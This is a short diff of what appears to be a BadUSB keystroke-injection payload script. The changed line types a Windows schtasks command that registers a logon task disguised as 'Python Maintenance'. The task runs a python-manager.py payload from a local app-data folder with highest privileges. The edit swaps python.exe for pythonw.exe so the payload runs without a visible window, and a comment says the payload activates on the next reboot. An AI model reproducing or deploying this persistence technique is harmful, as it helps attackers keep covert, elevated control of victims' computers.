@@ -94,7 +94,7 @@ RIGHT
 ENTER
 
 REM Add task for startup run as admin
-STRINGLN schtasks /Create /TN "Python Maintenance" /TR "\"%localappdata%\python1\python.exe\" \"%localappdata%\python1\python-manager.py\"" /SC ONLOGON /RL HIGHEST /F
+STRINGLN schtasks /Create /TN "Python Maintenance" /TR "\"%localappdata%\python1\pythonw.exe\" \"%localappdata%\python1\python-manager.py\"" /SC ONLOGON /RL HIGHEST /F
 
 REM Payload will start working on next reboot.
 
